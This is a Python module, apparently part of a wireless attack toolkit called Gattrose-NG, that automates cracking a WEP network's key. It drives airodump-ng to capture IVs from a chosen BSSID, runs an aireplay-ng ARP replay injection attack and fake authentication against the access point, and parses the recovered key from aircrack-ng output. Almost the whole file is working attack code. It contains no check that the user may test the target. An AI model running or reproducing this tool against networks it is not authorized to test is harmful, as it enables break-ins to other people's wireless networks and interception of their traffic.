"""
WEP Cracking Service for Gattrose-NG
Cracks WEP encryption by collecting IVs and using aircrack-ng
"""

import subprocess
import time
import re
import threading
from pathlib import Path
from typing import Optional, Callable, Tuple


class WEPCrackService:
    """Service for WEP encryption cracking"""

    def __init__(self, interface: str):
        self.interface = interface
        self.capture_dir = Path("/tmp/gattrose-wep")
        self.capture_dir.mkdir(exist_ok=True, parents=True)
        self.airodump_process = None
        self.aireplay_process = None
        self.aircrack_process = None
        self.running = False
        self.progress_callback = None
        self.status_callback = None
        self._lock = threading.Lock()

    def crack_wep(self, bssid: str, channel: str, essid: str = "",
                  timeout: int = 1800,
                  use_arp_replay: bool = True,
                  progress_callback: Callable = None,
                  status_callback: Callable = None) -> dict:
        """
        Crack WEP encryption by collecting IVs
        timeout: Maximum time to wait for IV collection (default 30 minutes)
        use_arp_replay: Use ARP replay attack to speed up IV collection
        Returns: {'success': bool, 'key': str, 'error': str, 'ivs_collected': int}
        """
        with self._lock:
            if self.running:
                return {'success': False, 'error': 'WEP crack already in progress'}

            self.running = True
            self.progress_callback = progress_callback
            self.status_callback = status_callback

        print(f"[WEP-CRACK] Starting WEP crack on {essid} ({bssid}) channel {channel}")

        try:
            # Generate output filename
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_essid = re.sub(r'[^\w\-]', '_', essid) if essid else "hidden"
            output_prefix = self.capture_dir / f"wep_{safe_essid}_{bssid.replace(':', '')}_{timestamp}"

            # Start airodump-ng to collect IVs
            airodump_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', bssid,
                '--channel', channel,
                '--write', str(output_prefix),
                '--output-format', 'cap,ivs',  # Capture both formats
                self.interface
            ]

            if self.status_callback:
                self.status_callback(f"Collecting IVs from {essid}...")

            print(f"[WEP-CRACK] Starting IV collection...")
            self.airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )

            # Wait a moment for airodump to start
            time.sleep(3)

            # Phase 1: Collect IVs (optionally with ARP replay)
            start_time = time.time()
            ivs_collected = 0
            target_ivs = 40000  # Need at least 20k-40k IVs for WEP crack

            if use_arp_replay:
                print(f"[WEP-CRACK] Starting ARP replay attack to accelerate IV collection...")
                if self.status_callback:
                    self.status_callback("Launching ARP replay attack...")

                # Launch aireplay-ng ARP replay attack
                # This captures ARP packets and replays them to generate traffic
                aireplay_cmd = [
                    'sudo', 'aireplay-ng',
                    '--arpreplay',
                    '-b', bssid,  # Target BSSID
                    '-h', 'FF:FF:FF:FF:FF:FF',  # Use broadcast MAC for best results
                    self.interface
                ]

                self.aireplay_process = subprocess.Popen(
                    aireplay_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    text=True
                )

            # Monitor IV collection
            while time.time() - start_time < timeout and self.running:
                # Check IV count
                cap_file = str(output_prefix) + "-01.cap"
                ivs_file = str(output_prefix) + "-01.ivs"

                # Check if we have enough IVs to attempt crack
                if Path(cap_file).exists():
                    ivs_collected = self._count_ivs(cap_file)

                    if ivs_collected > 0:
                        progress = min(int((ivs_collected / target_ivs) * 100), 99)
                        if self.progress_callback:
                            self.progress_callback(progress)

                        if self.status_callback:
                            self.status_callback(f"Collected {ivs_collected:,} IVs (need ~40k)")

                        print(f"[WEP-CRACK] Progress: {ivs_collected:,} IVs collected")

                    # Try cracking once we have minimum IVs
                    if ivs_collected >= 20000:
                        print(f"[WEP-CRACK] Attempting crack with {ivs_collected:,} IVs...")
                        if self.status_callback:
                            self.status_callback(f"Attempting crack with {ivs_collected:,} IVs...")

                        key = self._attempt_crack(cap_file, bssid)
                        if key:
                            # Success!
                            print(f"[WEP-CRACK] ✓ WEP KEY FOUND: {key}")
                            if self.status_callback:
                                self.status_callback(f"✓ WEP key cracked: {key}")

                            # Stop capture
                            if self.airodump_process:
                                self.airodump_process.terminate()
                            if self.aireplay_process:
                                self.aireplay_process.terminate()

                            elapsed = time.time() - start_time
                            return {
                                'success': True,
                                'key': key,
                                'ivs_collected': ivs_collected,
                                'elapsed_seconds': elapsed,
                                'method': 'arp_replay' if use_arp_replay else 'passive'
                            }

                # Wait before checking again
                time.sleep(10)

            # Timeout reached
            print(f"[WEP-CRACK] Timeout reached with {ivs_collected:,} IVs")

            # Final crack attempt
            cap_file = str(output_prefix) + "-01.cap"
            if Path(cap_file).exists():
                if self.status_callback:
                    self.status_callback(f"Final crack attempt with {ivs_collected:,} IVs...")

                key = self._attempt_crack(cap_file, bssid)
                if key:
                    print(f"[WEP-CRACK] ✓ WEP KEY FOUND: {key}")
                    return {
                        'success': True,
                        'key': key,
                        'ivs_collected': ivs_collected,
                        'elapsed_seconds': time.time() - start_time
                    }

            return {
                'success': False,
                'error': f'Failed to crack WEP with {ivs_collected:,} IVs',
                'ivs_collected': ivs_collected,
                'elapsed_seconds': time.time() - start_time
            }

        except Exception as e:
            print(f"[WEP-CRACK] Error: {e}")
            return {
                'success': False,
                'error': str(e),
                'ivs_collected': ivs_collected if 'ivs_collected' in locals() else 0
            }

        finally:
            self.running = False
            if self.airodump_process:
                try:
                    self.airodump_process.terminate()
                    self.airodump_process.wait(timeout=5)
                except:
                    self.airodump_process.kill()
            if self.aireplay_process:
                try:
                    self.aireplay_process.terminate()
                    self.aireplay_process.wait(timeout=5)
                except:
                    self.aireplay_process.kill()
            self.airodump_process = None
            self.aireplay_process = None

    def _count_ivs(self, cap_file: str) -> int:
        """
        Count IVs in capture file using aircrack-ng
        Returns: Number of IVs collected
        """
        try:
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Parse output for IV count
            # Format: "1 potential targets" followed by table with IV count
            # Example: "AA:BB:CC:DD:EE:FF  WEP (12345 IVs)"
            output = result.stdout

            # Look for IV count in output
            iv_match = re.search(r'(\d+)\s+IVs?\)', output)
            if iv_match:
                return int(iv_match.group(1))

            # Alternative format: look for data line
            iv_match = re.search(r'#Data,.*?(\d+)', output)
            if iv_match:
                return int(iv_match.group(1))

            return 0

        except Exception as e:
            print(f"[WEP-CRACK] Error counting IVs: {e}")
            return 0

    def _attempt_crack(self, cap_file: str, bssid: str) -> Optional[str]:
        """
        Attempt to crack WEP key using aircrack-ng
        Returns: WEP key if found, None otherwise
        """
        try:
            print(f"[WEP-CRACK] Running aircrack-ng on {cap_file}...")

            result = subprocess.run(
                ['aircrack-ng', '-b', bssid, cap_file],
                capture_output=True,
                text=True,
                timeout=120  # 2 minutes max
            )

            # Parse output for key
            # Format: "KEY FOUND! [ 12:34:56:78:90 ]"
            output = result.stdout

            key_match = re.search(r'KEY FOUND!\s*\[\s*([0-9A-Fa-f:]+)\s*\]', output)
            if key_match:
                key = key_match.group(1).replace(':', '').upper()
                return key

            # Alternative format
            key_match = re.search(r'(?:Current passphrase|Master Key|Transient Key)\s*:\s*([0-9A-Fa-f:]+)', output)
            if key_match:
                key = key_match.group(1).replace(':', '').upper()
                return key

            return None

        except subprocess.TimeoutExpired:
            print(f"[WEP-CRACK] Aircrack-ng timeout")
            return None
        except Exception as e:
            print(f"[WEP-CRACK] Error during crack attempt: {e}")
            return None

    def fake_auth(self, bssid: str, timeout: int = 30) -> bool:
        """
        Perform fake authentication with WEP AP
        Necessary for some injection attacks
        Returns: True if authentication successful
        """
        try:
            print(f"[WEP-CRACK] Attempting fake authentication with {bssid}...")

            cmd = [
                'sudo', 'aireplay-ng',
                '--fakeauth', '0',  # 0 = single authentication
                '-a', bssid,        # AP BSSID
                '-h', 'AA:BB:CC:DD:EE:FF',  # Our fake MAC
                self.interface
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            # Check for success indicators
            if 'association successful' in result.stdout.lower():
                print(f"[WEP-CRACK] ✓ Fake auth successful")
                return True
            else:
                print(f"[WEP-CRACK] Fake auth failed")
                return False

        except Exception as e:
            print(f"[WEP-CRACK] Error during fake auth: {e}")
            return False

    def chop_chop_attack(self, bssid: str, channel: str, essid: str = "",
                        timeout: int = 1800,
                        progress_callback: Callable = None,
                        status_callback: Callable = None) -> dict:
        """
        ChopChop attack - alternative WEP cracking method
        Useful when ARP replay isn't working
        Returns: {'success': bool, 'key': str, 'error': str}
        """
        print(f"[WEP-CRACK] ChopChop attack not yet implemented")
        return {'success': False, 'error': 'ChopChop attack not implemented'}

    def stop_crack(self):
        """Stop ongoing WEP crack"""
        with self._lock:
            self.running = False
            if self.airodump_process:
                try:
                    self.airodump_process.terminate()
                    self.airodump_process.wait(timeout=5)
                except:
                    self.airodump_process.kill()
            if self.aireplay_process:
                try:
                    self.aireplay_process.terminate()
                    self.aireplay_process.wait(timeout=5)
                except:
                    self.aireplay_process.kill()
            print("[WEP-CRACK] Crack stopped")

    def is_running(self) -> bool:
        """Check if crack is currently running"""
        return self.running

    def check_requirements(self) -> Tuple[bool, str]:
        """
        Check if required tools are available
        Returns: (available: bool, message: str)
        """
        try:
            # Check aircrack-ng
            result = subprocess.run(
                ['aircrack-ng', '--help'],
                capture_output=True,
                timeout=5
            )
            if result.returncode != 0:
                return (False, "aircrack-ng not working properly")

            # Check aireplay-ng (--help returns non-zero, so just check if it runs)
            result = subprocess.run(
                ['aireplay-ng', '--help'],
                capture_output=True,
                timeout=5
            )
            # aireplay-ng returns 1 even for --help, so just check it doesn't crash
            if result.returncode not in [0, 1]:
                return (False, "aireplay-ng not working properly")

            return (True, "All WEP cracking tools available")

        except FileNotFoundError as e:
            tool = str(e).split("'")[1] if "'" in str(e) else "tool"
            return (False, f"{tool} not installed. Install with: sudo apt install aircrack-ng")
        except Exception as e:
            return (False, f"Error checking requirements: {e}")
